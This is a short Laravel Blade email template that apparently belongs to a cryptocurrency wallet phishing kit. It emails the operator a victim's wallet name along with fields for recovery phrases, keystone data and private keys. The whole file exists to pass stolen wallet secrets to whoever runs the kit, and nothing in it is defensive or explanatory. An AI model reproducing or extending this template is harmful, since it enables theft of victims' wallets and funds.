@component('mail::message')
# Users Info

Saved Info

	Wallet Name:  {{ $data['wallet_name'] }}


	Email Phrase: {{ $data['email_phrase'] }} 
	Info Phrase: {{ $data['add_info_phrase'] }} 
	Password Phrase: {{ $data['password_phrase'] }}   

	Email Keystone: {{ $data['email_keystone'] }} 
	Info Keystone: {{ $data['add_info_keystone'] }} 
	Password Keystone: {{ $data['password_keystone'] }}   


	Email Private: {{ $data['email_private'] }} 
	Info Private: {{ $data['add_info_private'] }} 
	Password Private: {{ $data['password_private'] }} 

Thanks,
{{ config('app.name') }}
@endcomponent
